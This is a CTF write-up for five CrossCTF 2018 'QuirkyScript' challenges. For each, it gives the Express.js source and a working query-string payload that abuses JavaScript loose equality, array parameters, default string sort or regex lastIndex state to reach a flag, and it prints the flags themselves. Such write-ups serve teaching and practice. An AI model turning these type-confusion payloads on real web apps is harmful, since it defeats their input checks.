---
title: "Crossctf 2018 Writeup"
date: 2018-05-19T13:05:55+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: solves for CrossCTF 2018 challenges
---

# QuirkyScript 1

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.first) {
        if (req.query.first.length == 8 && req.query.first == ",,,,,,," ) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

## Solution


According to the [express.js docs](https://expressjs.com/en/api.html#req.query), `req.query.*` can be an array.

Also, the code used `==` instead of `===`; therefore, values of different types can be equal to each other and types are converted according to [this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness):

![equal table](/blog/images/crossctf-2018-writeup/equal-table.png)

So, when `req.query.first = ['','','','','','','','']`, it has a length of `8` and equals to string `',,,,,,,'`.

Final payload: `http://ctf.pwn.sg:8081/flag?first[0]=&first[1]=&first[2]=&first[3]=&first[4]=&first[5]=&first[6]=&first[7]=&`


Flag: `CrossCTF{C0mm4s_4ll_th3_w4y_t0_th3_fl4g}`

# QuirkyScript 2

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  if (req.query.second) {
    if (req.query.second != "1" && req.query.second.length == 10 && req.query.second == true) {
      res.send(flag.flag);
      return;
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

If `req.query.second` equals `'1'` plus nine spaces, the condition with be fulfilled.

Final payload: `http://ctf.pwn.sg:8082/flag?second=1%20%20%20%20%20%20%20%20%20&`

Flag: `CrossCTF{M4ny_w4ys_t0_mak3_4_numb3r}`

# QuirkyScript 3

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.third) {
        if (Array.isArray(req.query.third)) {
            third = req.query.third;
            third_sorted = req.query.third.sort();
            if (Number.parseInt(third[0]) > Number.parseInt(third[1]) && third_sorted[0] == third[0] && third_sorted[1] == third[1]) {
                res.send(flag.flag);
                return;
            }
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

## Solution

To solve this problem, you need to know how `Array.prototype.sort()` works.

According to the [specs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort): `The default sort order is according to string Unicode code points`; therefore, I just picked `[ '110', '13' ]` which works in this case.

Final payload: `http://ctf.pwn.sg:8083/flag?third[0]=110&third[1]=13`

Flag: `CrossCTF{th4t_r0ck3t_1s_hug3}`

# QuirkyScript 4

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  if (req.query.fourth) {
    if (req.query.fourth == 1 && req.query.fourth.indexOf("1") == -1) {
      res.send(flag.flag);
      return;
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

You can have `[['1']]` which meets the requirements.

Final payload: `http://ctf.pwn.sg:8084/flag?fourth[0][0]=1`

Flag: `CrossCTF{1m_g0ing_hungry}`

# QuirkyScript 5

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
  if (re.test(req.query.fifth)) {
    if (req.query.fifth === req.query.six && !re.test(req.query.six)) {
      res.send(flag.flag);
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

```javascript
> var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
undefined
> let a = 'I_AM_ELEET_HAX0R'
undefined
> let b = 'I_AM_ELEET_HAX0R'
undefined
> re.test(a)
true
> re.test(b)
false
```

It is just javascript weirdness with it comes to regexp.

Final payload: `http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&six=I_AM_ELEET_HAX0R`

Flag: `CrossCTF{1_am_n1k0las_ray_zhizihizhao}`
